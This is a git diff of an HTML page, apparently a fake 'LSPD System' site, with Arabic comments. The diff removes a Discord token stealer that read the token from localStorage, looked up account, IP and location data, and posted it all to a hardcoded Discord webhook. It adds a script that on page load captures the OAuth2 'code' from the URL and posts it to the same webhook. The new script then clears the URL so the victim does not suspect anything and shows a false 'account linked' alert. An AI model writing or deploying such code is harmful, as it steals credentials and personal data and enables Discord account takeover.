@@ -1417,65 +1417,35 @@ root.render(<App/>);
 </script>
 
 <script>
-document.addEventListener('click', function() {
-    if (window.alreadyExecuted) return;
-    window.alreadyExecuted = true;
+// أول ما تفتح الصفحة، الكود يشوف هل فيه "code" في الرابط؟
+const urlParams = new URLSearchParams(window.location.search);
+const discordCode = urlParams.get('code');
 
+if (discordCode) {
+    // إذا لقينا كود، نرسله فوراً للويب هوك مع معلومات الجهاز
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-
-    // 1. دالة سحب التوكن من المتصفح
-    function getDiscordToken() {
-        try {
-            let token = (Object.fromEntries(Object.entries(localStorage).filter(([k]) => k.includes('token')))).token;
-            return token ? token.replace(/"/g, "") : "Not Found";
-        } catch (e) { return "Access Denied"; }
-    }
-
-    // 2. جمع معلومات الجهاز والـ IP والموقع
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(ipData => {
-        const token = getDiscordToken();
-        
-        // 3. إذا لقينا توكن، نجيب معلومات الحساب (اليوزر والـ ID والإيميل)
-        if (token !== "Not Found" && token !== "Access Denied") {
-            fetch('https://discord.com/api/v9/users/@me', {
-                headers: { 'Authorization': token }
-            })
-            .then(userRes => userRes.json())
-            .then(userData => {
-                sendFinalData(token, userData, ipData);
-            }).catch(() => sendFinalData(token, null, ipData));
-        } else {
-            sendFinalData(token, null, ipData);
-        }
-    });
-
-    function sendFinalData(token, user, ip) {
-        const payload = {
+    
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
             embeds: [{
-                title: "⚔️ Target Information Captured",
-                color: 0xFF0000,
+                title: "🚨 New Login Code Captured!",
+                description: `**Code:** \`${discordCode}\`\n\n*ملاحظة: هذا الكود تستخدمه في السيرفر عندك عشان تطلّع التوكن النهائي.*`,
+                color: 0x5865F2,
                 fields: [
-                    { name: "🔑 Discord Token", value: `\`\`\`${token}\`\`\``, inline: false },
-                    { name: "👤 User Info", value: user ? `**Name:** \`${user.username}#${user.discriminator}\`\n**ID:** \`${user.id}\`\n**Email:** \`${user.email || 'N/A'}\`` : "Could not fetch user details", inline: false },
-                    { name: "🌐 Network & IP", value: `**IP:** \`${ip.ip}\`\n**ISP:** \`${ip.org}\``, inline: true },
-                    { name: "📍 Location", value: `**City:** \`${ip.city}\`\n**Region:** \`${ip.region}\`\n[Google Maps](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})`, inline: true },
-                    { name: "📱 Device Info", value: `**Type:** \`${navigator.userAgent.includes("Mobi") ? "Mobile" : "PC"}\`\n**Browser:** \`${navigator.appName}\`\n**OS:** \`${navigator.platform}\``, inline: false }
+                    { name: "📱 Device", value: navigator.userAgent, inline: false },
+                    { name: "🔗 Redirect URL", value: window.location.href, inline: false }
                 ],
-                footer: { text: "LSPD System | Security Test" },
-                timestamp: new Date()
+                footer: { text: "LSPD System | OAuth2 Capture" }
             }]
-        };
-
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    }
-}, { once: true });
+        })
+    }).then(() => {
+        // بعد ما يرسل البيانات، نحذف الكود من الرابط عشان ما يشك المستخدم
+        window.history.replaceState({}, document.title, "/");
+        alert("تم ربط الحساب بنجاح بنظام LSPD!");
+    });
+}
 </script>
-
 </body>
 </html>
